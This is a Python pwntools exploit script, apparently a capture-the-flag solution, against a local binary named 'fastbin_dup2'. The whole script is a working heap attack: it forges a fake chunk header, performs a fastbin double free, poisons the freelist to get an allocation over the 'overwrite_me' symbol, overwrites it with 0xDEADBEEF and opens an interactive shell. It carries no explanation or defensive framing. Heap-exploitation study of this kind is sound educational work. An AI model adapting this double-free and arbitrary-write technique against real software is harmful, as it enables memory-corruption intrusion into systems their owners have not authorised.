from pwn import *

p = process("./fastbin_dup2")
e = ELF("./fastbin_dup2")

def add(data):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"Data: ", data)

def delete(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def getshell():
    p.sendlineafter(b"> ", b"3")
    p.interactive()


p.sendafter(b"Name : ", p64(0)+p64(0x31))

add(b"AAAA") # 0
add(b"AAAA") # 1

delete(0) # Fastbin : 0
delete(1) # Fastbin : 0 -> 1
delete(0) # Fastbin : 0 -> 1 -> 0

add(p64(e.symbols["overwrite_me"]-0x10))
add(b"AAAA")
add(b"AAAA")
add(p64(0xDEADBEEF))
getshell()